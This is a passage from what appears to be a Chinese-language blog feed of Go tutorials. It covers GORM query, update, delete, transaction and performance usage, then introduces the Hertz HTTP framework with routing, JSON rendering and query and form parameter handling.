BETWEEN</span></span><br><span class="line">db.Where(<span class="string">"created_at BETWEEN ? AND ?"</span>, lastWeek, today).Find(&amp;users)</span><br><span class="line"><span class="comment">// SELECT * FROM users WHERE created_at BETWEEN '2000-01-01 00:00:00' AND '2000-01-08 00:00:00';</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>也可以传入结构体 /map 作为条件，例子如下。当传入结构体时，非零字段（0，""，nil）会作为条件，如果要使用零值进行筛选，只可以使用 map 条件。</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// Struct</span></span><br><span class="line">db.Where(&amp;User{Name: <span class="string">"jinzhu"</span>, Age: <span class="number">20</span>}).First(&amp;user)</span><br><span class="line"><span class="comment">// SELECT * FROM users WHERE name = "jinzhu" AND age = 20 ORDER BY id LIMIT 1;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Map</span></span><br><span class="line">db.Where(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">interface</span>{}{<span class="string">"name"</span>: <span class="string">"jinzhu"</span>, <span class="string">"age"</span>: <span class="number">20</span>}).Find(&amp;users)</span><br><span class="line"><span class="comment">// SELECT * FROM users WHERE name = "jinzhu" AND age = 20;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Slice of primary keys</span></span><br><span class="line">db.Where([]<span class="keyword">int64</span>{<span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>}).Find(&amp;users)</span><br><span class="line"><span class="comment">// SELECT * FROM users WHERE id IN (20, 21, 22);</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<h5 id="内联条件">内联条件</h5>
<p><code>First</code> 中可以类似 <code>Where</code>，进行条件内联。</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// Get by primary key if it were a non-integer type</span></span><br><span class="line">db.First(&amp;user, <span class="string">"id = ?"</span>, <span class="string">"string_primary_key"</span>)</span><br><span class="line"><span class="comment">// SELECT * FROM users WHERE id = 'string_primary_key';</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Plain SQL</span></span><br><span class="line">db.Find(&amp;user, <span class="string">"name = ?"</span>, <span class="string">"jinzhu"</span>)</span><br></pre></td></tr></tbody></table></figure>
<p>更详细的介绍参见<a href="https://gorm.io/zh_CN/docs/query.html">查询 | GORM - The fantastic ORM library for Golang, aims to be developer friendly.</a>。</p>
<h3 id="更新记录">更新记录</h3>
<h4 id="全部">全部</h4>
<p><code>Save</code> 会保存所有的字段，即使字段是零值</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line">db.First(&amp;user)</span><br><span class="line"></span><br><span class="line">user.Name = <span class="string">"jinzhu 2"</span></span><br><span class="line">user.Age = <span class="number">100</span></span><br><span class="line">db.Save(&amp;user)</span><br><span class="line"><span class="comment">// UPDATE users SET name='jinzhu 2', age=100, birthday='2016-01-01', updated_at = '2013-11-17 21:34:10' WHERE id=111;</span></span><br></pre></td></tr></tbody></table></figure>
<p><code>Save</code> 是一个组合函数。 如果保存值不包含主键，它将执行 <code>Create</code>，否则它将执行 <code>Update</code> (包含所有字段)。</p>
<h4 id="单列">单列</h4>
<p>可以根据条件、model、条件 &amp; model 完成指定列的参数更新。当使用 <code>Update</code> 更新单列时，需要有一些条件，否则将会引起 <code>ErrMissingWhereClause</code> 错误，详见<a href="https://gorm.io/zh_CN/docs/update.html#block_global_updates">阻止全局更新</a> 。 当使用 <code>Model</code> 方法，并且它有主键值时，主键将会被用于构建条件，例如：</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// 根据条件更新</span></span><br><span class="line">db.Model(&amp;User{}).Where(<span class="string">"active = ?"</span>, <span class="literal">true</span>).Update(<span class="string">"name"</span>, <span class="string">"hello"</span>)</span><br><span class="line"><span class="comment">// UPDATE users SET name='hello', updated_at='2013-11-17 21:34:10' WHERE active=true;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// User 的 ID 是 `111`</span></span><br><span class="line">db.Model(&amp;user).Update(<span class="string">"name"</span>, <span class="string">"hello"</span>)</span><br><span class="line"><span class="comment">// UPDATE users SET name='hello', updated_at='2013-11-17 21:34:10' WHERE id=111;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据条件和 model 的值进行更新</span></span><br><span class="line">db.Model(&amp;user).Where(<span class="string">"active = ?"</span>, <span class="literal">true</span>).Update(<span class="string">"name"</span>, <span class="string">"hello"</span>)</span><br><span class="line"><span class="comment">// UPDATE users SET name='hello', updated_at='2013-11-17 21:34:10' WHERE id=111 AND active=true;</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<h4 id="多列">多列</h4>
<p>类似地，支持使用结构体和 map 更新，struct 只更新非零值。</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// 根据 `struct` 更新属性，只会更新非零值的字段</span></span><br><span class="line">db.Model(&amp;user).Updates(User{Name: <span class="string">"hello"</span>, Age: <span class="number">18</span>, Active: <span class="literal">false</span>})</span><br><span class="line"><span class="comment">// UPDATE users SET name='hello', age=18, updated_at = '2013-11-17 21:34:10' WHERE id = 111;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据 `map` 更新属性</span></span><br><span class="line">db.Model(&amp;user).Updates(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">interface</span>{}{<span class="string">"name"</span>: <span class="string">"hello"</span>, <span class="string">"age"</span>: <span class="number">18</span>, <span class="string">"active"</span>: <span class="literal">false</span>})</span><br><span class="line"><span class="comment">// UPDATE users SET name='hello', age=18, active=false, updated_at='2013-11-17 21:34:10' WHERE id=111;</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<h4 id="hooks-1">Hooks</h4>
<p>GORM 支持的 hook 包括：<code>BeforeSave</code>, <code>BeforeUpdate</code>, <code>AfterSave</code>, <code>AfterUpdate</code>. 更新记录时将调用这些方法，查看 <a href="https://gorm.io/zh_CN/docs/hooks.html">Hooks</a> 获取详细信息</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(u *User)</span> <span class="title">BeforeUpdate</span><span class="params">(tx *gorm.DB)</span> <span class="params">(err error)</span></span> {</span><br><span class="line">    <span class="keyword">if</span> u.Role == <span class="string">"admin"</span> {</span><br><span class="line">        <span class="keyword">return</span> errors.New(<span class="string">"admin user not allowed to update"</span>)</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h3 id="删除">删除</h3>
<h4 id="单条">单条</h4>
<p>删除对象需要指定主键，否则会触发 <a href="https://gorm.io/zh_CN/docs/delete.html#batch_delete">批量删除</a>，例如：</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// Email 的 ID 是 `10`</span></span><br><span class="line">db.Delete(&amp;email)</span><br><span class="line"><span class="comment">// DELETE from emails where id = 10;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 带额外条件的删除</span></span><br><span class="line">db.Where(<span class="string">"name = ?"</span>, <span class="string">"jinzhu"</span>).Delete(&amp;email)</span><br><span class="line"><span class="comment">// DELETE from emails where id = 10 AND name = "jinzhu";</span></span><br></pre></td></tr></tbody></table></figure>
<h4 id="根据主键删除">根据主键删除</h4>
<p>GORM 允许通过主键 (可以是复合主键) 和内联条件来删除对象，类似 <code>First</code> 函数。详见 <a href="https://gorm.io/zh_CN/docs/query.html#inline_conditions">查询 - 内联条件（Query Inline Conditions）</a> 。</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line">db.Delete(&amp;User{}, <span class="number">10</span>)</span><br><span class="line"><span class="comment">// DELETE FROM users WHERE id = 10;</span></span><br><span class="line"></span><br><span class="line">db.Delete(&amp;User{}, <span class="string">"10"</span>)</span><br><span class="line"><span class="comment">// DELETE FROM users WHERE id = 10;</span></span><br><span class="line"></span><br><span class="line">db.Delete(&amp;users, []<span class="keyword">int</span>{<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>})</span><br><span class="line"><span class="comment">// DELETE FROM users WHERE id IN (1,2,3);</span></span><br></pre></td></tr></tbody></table></figure>
<h4 id="批量删除">批量删除</h4>
<p>如果指定的值不包括主属性，那么 GORM 会执行批量删除，它将删除所有匹配的记录</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line">db.Where(<span class="string">"email LIKE ?"</span>, <span class="string">"%jinzhu%"</span>).Delete(&amp;Email{})</span><br><span class="line"><span class="comment">// DELETE from emails where email LIKE "%jinzhu%";</span></span><br><span class="line"></span><br><span class="line">db.Delete(&amp;Email{}, <span class="string">"email LIKE ?"</span>, <span class="string">"%jinzhu%"</span>)</span><br><span class="line"><span class="comment">// DELETE from emails where email LIKE "%jinzhu%";</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>可以将一个主键切片传递给 Delete 方法，以便更高效的删除多条记录</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> users = []User{{ID: <span class="number">1</span>}, {ID: <span class="number">2</span>}, {ID: <span class="number">3</span>}}</span><br><span class="line">db.Delete(&amp;users)</span><br><span class="line"><span class="comment">// DELETE FROM users WHERE id IN (1,2,3);</span></span><br><span class="line"></span><br><span class="line">db.Delete(&amp;users, <span class="string">"name LIKE ?"</span>, <span class="string">"%jinzhu%"</span>)</span><br><span class="line"><span class="comment">// DELETE FROM users WHERE name LIKE "%jinzhu%" AND id IN (1,2,3); </span></span><br></pre></td></tr></tbody></table></figure>
<h4 id="软删除">软删除</h4>
<p>如果模型包含了 <code>gorm.DeletedAt</code> 字段，则拥有了软删除的能力。当调用 <code>Delete</code> 时，GORM 并不会从数据库中删除该记录，<strong>而是将该记录的 <code>DeleteAt</code> 设置为当前时间</strong>，而后的一般查询方法将无法查找到此条记录（where 中自动过滤掉）。</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// user's ID is `111`</span></span><br><span class="line">db.Delete(&amp;user)</span><br><span class="line"><span class="comment">// UPDATE users SET deleted_at="2013-10-29 10:23" WHERE id = 111;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Batch Delete</span></span><br><span class="line">db.Where(<span class="string">"age = ?"</span>, <span class="number">20</span>).Delete(&amp;User{})</span><br><span class="line"><span class="comment">// UPDATE users SET deleted_at="2013-10-29 10:23" WHERE age = 20;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Soft deleted records will be ignored when querying</span></span><br><span class="line">db.Where(<span class="string">"age = 20"</span>).Find(&amp;user)</span><br><span class="line"><span class="comment">// SELECT * FROM users WHERE age = 20 AND deleted_at IS NULL;</span></span><br></pre></td></tr></tbody></table></figure>
<p>可以使用 <code>Unscoped</code> 来查询到被软删除的记录，或者永久删除匹配的记录</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// 不过滤被软删除的记录</span></span><br><span class="line">db.Unscoped().Where(<span class="string">"age = 20"</span>).Find(&amp;users)</span><br><span class="line"><span class="comment">// SELECT * FROM users WHERE age = 20;</span></span><br><span class="line"><span class="comment">// 永久删除</span></span><br><span class="line">db.Unscoped().Delete(&amp;order)</span><br><span class="line"><span class="comment">// DELETE FROM orders WHERE id=10;</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<h4 id="删除标识">删除标识</h4>
<p>保存删除时间戳会占用较多空间，在不关心时间的情况下，一个 0/1 整数亦可以作为软删除的标识。使用 <code>gorm.io/plugin/soft_delete</code> 的一个例子如下：</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">"gorm.io/plugin/soft_delete"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> {</span><br><span class="line">  ID    <span class="keyword">uint</span></span><br><span class="line">  Name  <span class="keyword">string</span></span><br><span class="line">  IsDel soft_delete.DeletedAt <span class="string">`gorm:"softDelete:flag"`</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查询 </span></span><br><span class="line"><span class="comment">// SELECT * FROM users WHERE is_del = 0;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 软删除</span></span><br><span class="line"><span class="comment">// UPDATE users SET is_del = 1 WHERE ID = 1;</span></span><br></pre></td></tr></tbody></table></figure>
<h4 id="hooks-2">Hooks</h4>
<p>对于删除操作，GORM 支持 <code>BeforeDelete</code>、<code>AfterDelete</code> Hook，在删除记录时会调用这些方法，查看 <a href="https://gorm.io/zh_CN/docs/hooks.html">Hook</a> 获取详情</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(u *User)</span> <span class="title">BeforeDelete</span><span class="params">(tx *gorm.DB)</span> <span class="params">(err error)</span></span> {</span><br><span class="line">    <span class="keyword">if</span> u.Role == <span class="string">"admin"</span> {</span><br><span class="line">        <span class="keyword">return</span> errors.New(<span class="string">"admin user not allowed to delete"</span>)</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h2 id="事务">事务</h2>
<p>事务对于 ORM 框架来说也不可或缺。为了保持一致性，GORM 默认在事务里进行写操作（创建、更新、删除）。如果没有这方面的要求，可以在初始化时禁用，这将获得大约 30%+ 性能提升。</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// 全局禁用</span></span><br><span class="line">db, err := gorm.Open(sqlite.Open(<span class="string">"gorm.db"</span>), &amp;gorm.Config{</span><br><span class="line">  SkipDefaultTransaction: <span class="literal">true</span>,</span><br><span class="line">})</span><br><span class="line"></span><br><span class="line"><span class="comment">// 持续会话模式</span></span><br><span class="line">tx := db.Session(&amp;Session{SkipDefaultTransaction: <span class="literal">true</span>})</span><br><span class="line">tx.First(&amp;user, <span class="number">1</span>)</span><br><span class="line">tx.Find(&amp;users)</span><br><span class="line">tx.Model(&amp;user).Update(<span class="string">"Age"</span>, <span class="number">18</span>)</span><br></pre></td></tr></tbody></table></figure>
<h3 id="用法">用法</h3>
<p>对于一系列操作，通过 <code>Transaction</code> 函数显式启动一个事务。</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line">db.Transaction(<span class="function"><span class="keyword">func</span><span class="params">(tx *gorm.DB)</span> <span class="title">error</span></span> {</span><br><span class="line">  <span class="comment">// 在事务中执行一些 db 操作（从这里开始，您应该使用 'tx' 而不是 'db'）</span></span><br><span class="line">  <span class="keyword">if</span> err := tx.Create(&amp;Animal{Name: <span class="string">"Giraffe"</span>}).Error; err != <span class="literal">nil</span> {</span><br><span class="line">    <span class="comment">// 返回任何错误都会回滚事务</span></span><br><span class="line">    <span class="keyword">return</span> err</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> err := tx.Create(&amp;Animal{Name: <span class="string">"Lion"</span>}).Error; err != <span class="literal">nil</span> {</span><br><span class="line">    <span class="keyword">return</span> err</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 返回 nil 提交事务</span></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">})</span><br></pre></td></tr></tbody></table></figure>
<h3 id="手动事务">手动事务</h3>
<p>Gorm 支持直接调用事务控制方法（commit、rollback），例如：</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// 开始事务</span></span><br><span class="line">tx := db.Begin()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在事务中执行一些 db 操作（从这里开始，您应该使用 'tx' 而不是 'db'）</span></span><br><span class="line">tx.Create(...)</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 遇到错误时回滚事务</span></span><br><span class="line">tx.Rollback()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 否则，提交事务</span></span><br><span class="line">tx.Commit()</span><br></pre></td></tr></tbody></table></figure>
<h2 id="性能优化">性能优化</h2>
<p>除了关闭默认事务外，还可以通过以下操作提升性能：</p>
<h3 id="缓存预编译语句">缓存预编译语句</h3>
<p>执行任何 SQL 时都创建并缓存预编译语句，可以提高后续的调用速度，详见<a href="https://gorm.io/zh_CN/docs/session.html">会话 | GORM - The fantastic ORM library for Golang, aims to be developer friendly.</a></p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// 全局模式</span></span><br><span class="line">db, err := gorm.Open(sqlite.Open(<span class="string">"gorm.db"</span>), &amp;gorm.Config{</span><br><span class="line">  PrepareStmt: <span class="literal">true</span>,</span><br><span class="line">})</span><br><span class="line"></span><br><span class="line"><span class="comment">// 会话模式</span></span><br><span class="line">tx := db.Session(&amp;Session{PrepareStmt: <span class="literal">true</span>})</span><br><span class="line">tx.First(&amp;user, <span class="number">1</span>)</span><br><span class="line">tx.Find(&amp;users)</span><br><span class="line">tx.Model(&amp;user).Update(<span class="string">"Age"</span>, <span class="number">18</span>)</span><br></pre></td></tr></tbody></table></figure>
<h3 id="选择字段">选择字段</h3>
<p>默认情况下，GORM 在查询时会选择所有的字段，可以使用 <code>Select</code> 来指定想要的字段</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line">db.Select(<span class="string">"Name"</span>, <span class="string">"Age"</span>).Find(&amp;Users{})</span><br></pre></td></tr></tbody></table></figure>
<p>或者定义一个较小的 API 结构体，使用 <a href="https://gorm.io/zh_CN/docs/advanced_query.html">智能选择字段功能</a></p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> {</span><br><span class="line">  ID     <span class="keyword">uint</span></span><br><span class="line">  Name   <span class="keyword">string</span></span><br><span class="line">  Age    <span class="keyword">int</span></span><br><span class="line">  Gender <span class="keyword">string</span></span><br><span class="line">  <span class="comment">// 假设后面还有几百个字段...</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> APIUser <span class="keyword">struct</span> {</span><br><span class="line">  ID   <span class="keyword">uint</span></span><br><span class="line">  Name <span class="keyword">string</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查询时会自动选择 `id`、`name` 字段</span></span><br><span class="line">db.Model(&amp;User{}).Limit(<span class="number">10</span>).Find(&amp;APIUser{})</span><br><span class="line"><span class="comment">// SELECT `id`, `name` FROM `users` LIMIT 10</span></span><br></pre></td></tr></tbody></table></figure>
<h2 id="总结">总结</h2>
<p>ORM 框架的学习以熟悉 API 为主，读一遍官方文档就可以了解个七七八八，剩下的可以用到时再查缺补漏。</p>
<h2 id="参考">参考</h2>
<ul>
<li><a href="https://learnku.com/docs/gorm/v2">《GORM 中文文档》 | Go 技术论坛 (learnku.com)</a></li>
<li><a href="https://gorm.io/zh_CN/">GORM - The fantastic ORM library for Golang, aims to be developer friendly.</a></li>
<li><a href="https://juejin.cn/post/7195352760450023481#heading-3">Go ORM 框架 ——Gorm 基础教程｜ 青训营笔记 - 掘金 (juejin.cn)</a></li>
<li><a href="https://www.cnblogs.com/infodriven/p/16351624.html">（十三）GORM 自动建表（Migration 特性） - 比特边界 - 博客园 (cnblogs.com)</a></li>
<li><a href="https://gorm.io/zh_CN/docs/performance.html">性能 | GORM - The fantastic ORM library for Golang, aims to be developer friendly.</a></li>
</ul>
]]></content>
      <categories>
        <category>后端</category>
        <category>ORM</category>
      </categories>
      <tags>
        <tag>golang</tag>
        <tag>ORM</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTP 微服务框架 Hertz 的入门实践</title>
    <url>/blog/2024/01/18/Hertz/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>Hertz 是一个 Golang 微服务 HTTP 框架，由字节跳动开源，具有高易用性、高性能、高扩展性等特点。</p>
<span id="more"></span>
<h2 id="架构">架构</h2>
<p>Hertz 的架构图如下所示，从上到下分为：</p>
<ul>
<li>应用层：提供前台的 Server、Client API
<ul>
<li>Server：参数绑定、<code>HandlerFunc</code> 注册、响应渲染</li>
<li> Client：DNS、服务发现</li>
<li>通用：Context、中间件</li>
</ul></li>
<li>路由层：在 httprouter 的基础上做了功能改进，同时支持静态路由、参数路由，支持优先级匹配、路由回溯等，为用户提供更高的自由度</li>
<li>协议层：支持多种网络协议，HTTP1、HTTP2、Websocket、QUIC 等，并支持自定义扩展</li>
<li>传输层：支持底层网络库扩展，原生适配 <code>Netpoll</code></li>
</ul>
<p>在整体架构之外，Hertz 还提供了：</p>
<ul>
<li>命令行工具 <code>hz</code>：根据 IDL 生成 / 更新项目脚手架，提供开箱即用的能力</li>
<li>公共组件 <code>common</code>：提供通用能力，包含错误处理、单元测试能力、可观测性（Log、Trace、Metrics 等）</li>
</ul>
<p><img src="hertz.png"></p>
<h2 id="快速上手">快速上手</h2>
<h3 id="环境准备">环境准备</h3>
<p>可以按照<a href="https://www.cloudwego.io/zh/docs/hertz/getting-started/#安装命令行工具-hz">快速开始 | CloudWeGo</a> 教程，安装 Golang 环境、Hertz 框架与 hz 工具。</p>
<h3 id="pingpong">pingpong</h3>
<p>新建 hertz_demo 项目，创建 main.go，代码如下</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">"context"</span></span><br><span class="line"></span><br><span class="line">	<span class="string">"github.com/cloudwego/hertz/pkg/app"</span></span><br><span class="line">	<span class="string">"github.com/cloudwego/hertz/pkg/app/server"</span></span><br><span class="line">	<span class="string">"github.com/cloudwego/hertz/pkg/common/utils"</span></span><br><span class="line">	<span class="string">"github.com/cloudwego/hertz/pkg/protocol/consts"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">    <span class="comment">// 创建默认服务器，可以传入选项更改行为</span></span><br><span class="line">	h := server.Default()</span><br><span class="line">	<span class="comment">// 注册路由和HandlerFunc</span></span><br><span class="line">	h.GET(<span class="string">"/ping"</span>, <span class="function"><span class="keyword">func</span><span class="params">(c context.Context, ctx *app.RequestContext)</span></span> {</span><br><span class="line">		ctx.JSON(consts.StatusOK, utils.H{<span class="string">"message"</span>: <span class="string">"pong"</span>})</span><br><span class="line">	})</span><br><span class="line">	<span class="comment">// 启动服务器</span></span><br><span class="line">	h.Spin()</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>运行以下命令，安装依赖并启动服务。</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">go mod tidy</span><br><span class="line">go run .</span><br></pre></td></tr></tbody></table></figure>
<p>可以观察到以下输出：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">2024/01/18 12:22:22.235809 engine.go:668: [Debug] HERTZ: Method=GET    absolutePath=/ping                     --&gt; handlerName=main.main.func1 (num=2 handlers)</span><br><span class="line">2024/01/18 12:22:22.235951 engine.go:396: [Info] HERTZ: Using network library=netpoll</span><br><span class="line">2024/01/18 12:22:22.237303 transport.go:115: [Info] HERTZ: HTTP server listening on address=[::]:8888</span><br></pre></td></tr></tbody></table></figure>
<p>日志中可以看到绑定的路由 <code>/ping</code> 与 HandlerFunc <code>main.main.func1</code>（匿名函数），以及使用的网络库 <code>netpoll</code>，服务默认启动在 8888 端口。在另一个 shell 中进行测试，验证成功。</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">❯ curl http://localhost:8888/ping</span><br><span class="line">{<span class="string">"message"</span>:<span class="string">"pong"</span>}% </span><br></pre></td></tr></tbody></table></figure>
<h3 id="路由注册">路由注册</h3>
<p>点进 <code>h.Get</code> 函数，签名如下，允许为一个路由绑定多个 Handler（不能超过 63 个），进行链式处理，<code>Get</code> 的返回值同样为 <code>IRoutes</code> 接口，可以链式完成路由注册。</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(group *RouterGroup)</span> <span class="title">GET</span><span class="params">(relativePath <span class="keyword">string</span>, handlers ...app.HandlerFunc)</span> <span class="title">IRoutes</span></span> </span><br><span class="line"><span class="comment">// app.HandlerFunc</span></span><br><span class="line"><span class="keyword">type</span> HandlerFunc <span class="function"><span class="keyword">func</span><span class="params">(c context.Context, ctx *RequestContext)</span></span></span><br></pre></td></tr></tbody></table></figure>
<p>HandlerFunc 是一个无参函数，接收两个参数：</p>
<ul>
<li>Context：标准长周期上下文，用于在 RPC Client 或者日志、Tracing 等组件间传递</li>
<li> RequestContext：短周期请求上下文，生命周期仅限于一次 HTTP 请求内</li>
</ul>
<p>设置两种上下文的原因在于，RPC、日志中的 context 可能需要异步传递和处理，短周期的 RequestContext 可能会出现数据不一致问题。</p>
<h3 id="响应渲染">响应渲染</h3>
<p>Hertz 支持渲染 html、json、xml 等格式作为响应，最常用的就是 json。在上面的例子中，使用以下函数完成渲染，接受 Http 响应码和任意的对象，在 <code>Render</code> 函数中完成响应码的设置、Content-type 的设置，并把 json 序列化后写入 Response body。</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// JSON serializes the given struct as JSON into the response body.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// It also sets the Content-Type as "application/json".</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(ctx *RequestContext)</span> <span class="title">JSON</span><span class="params">(code <span class="keyword">int</span>, obj <span class="keyword">interface</span>{})</span></span> {</span><br><span class="line">	ctx.Render(code, render.JSONRender{Data: obj})</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>其他格式的渲染与之类似，这里就不赘述了。</p>
<h3 id="参数获取">参数获取</h3>
<p>上面的例子没有提到参数如何获取，补充如下</p>
<h4 id="query">query</h4>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// Query string parameters are parsed using the existing underlying request object.</span></span><br><span class="line"><span class="comment">// The request responds to url matching: /welcome?firstname=Jane&amp;lastname=Doe&amp;food=apple&amp;food=fish</span></span><br><span class="line">h.GET(<span class="string">"/welcome"</span>, <span class="function"><span class="keyword">func</span><span class="params">(ctx context.Context, c *app.RequestContext)</span></span> {</span><br><span class="line">    <span class="comment">// 获取单个Query参数，提供默认值</span></span><br><span class="line">    firstname := c.DefaultQuery(<span class="string">"firstname"</span>, <span class="string">"Guest"</span>)</span><br><span class="line">    <span class="comment">// shortcut for c.Request.URL.Query().Get("lastname")</span></span><br><span class="line">    <span class="comment">// 默认空值</span></span><br><span class="line">    lastname := c.Query(<span class="string">"lastname"</span>)</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 迭代Query参数</span></span><br><span class="line">    <span class="comment">// Iterate all queries and store the one with meeting the conditions in favoriteFood</span></span><br><span class="line">    <span class="keyword">var</span> favoriteFood []<span class="keyword">string</span></span><br><span class="line">    c.QueryArgs().VisitAll(<span class="function"><span class="keyword">func</span><span class="params">(key, value []<span class="keyword">byte</span>)</span></span> {</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">string</span>(key) == <span class="string">"food"</span> {</span><br><span class="line">            favoriteFood = <span class="built_in">append</span>(favoriteFood, <span class="keyword">string</span>(value))</span><br><span class="line">        }</span><br><span class="line">    })</span><br><span class="line"></span><br><span class="line">    c.String(consts.StatusOK, <span class="string">"Hello %s %s, favorite food: %s"</span>, firstname, lastname, favoriteFood)</span><br><span class="line">})</span><br></pre></td></tr></tbody></table></figure>
<h4 id="form">form</h4>
<p>form 有两种 content-type，需要选择对应的方法。</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// content-type : application/x-www-form-urlencoded</span></span><br><span class="line">h.POST(<span class="string">"/urlencoded"</span>, <span class="function"><span class="keyword">func</span><span class="params">(ctx context.Context, c *app.RequestContext)</span></span> {</span><br><span class="line">    <span class="comment">// 单个参数，返回类型 string</span></span><br><span class="line">    name := c.PostForm(<span class="string">"name"</span>)</span><br><span class="line">    message := c.PostForm(<span class="string">"message"</span>)</span><br><span class="line">	<span class="comment">// 迭代所有参数</span></span><br><span class="line">    c.PostArgs().VisitAll(<span class="function"><span class="keyword">func</span><span class="params">(key, value []<span class="keyword">byte</span>)</span></span> {</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">string</span>(key) == <span class="string">"name"</span> {</span><br><span class="line">            fmt.Printf(<span class="string">"This is %s!"</span>, <span class="keyword">string</span>(value))</span><br><span class="line">        }</span><br><span class="line">    })</span><br><span class="line"></span><br><span class="line">    c.String(consts.StatusOK, <span class="string">"name: %s; message: %s"</span>, name, message)</span><br><span class="line">})</span><br><span class="line"></span><br><span class="line"><span class="comment">// content-type : multipart/form-data</span></span><br><span class="line">h.POST(<span class="string">"/formdata"</span>, <span class="function"><span class="keyword">func</span><span class="params">(ctx context.Context, c *app.RequestContext)</span></span> {</span><br><span class="line">    <span class="comment">// 单个参数，返回类型 []byte</span></span><br><span class="line">    id := c.FormValue(<span class="string">"id"</span>)</span><br><span class="line">    name := c.FormValue(<span class="string">"name"</span>)</span><br><span class="line">    message := c.FormValue(<span class="string">"message"</span>)</span><br><span class="line">	<span class="comment">// 迭代所有参数</span></span><br><span class="line">    c.String(consts.StatusOK, <span class="string">"id: %s; name: %s; message: %s\n"</span>, id, name, message)</span><br><span class="line">})</span><br></pre></td></tr></tbody></table></figure>
<h4 id="cookie">cookie</h4>
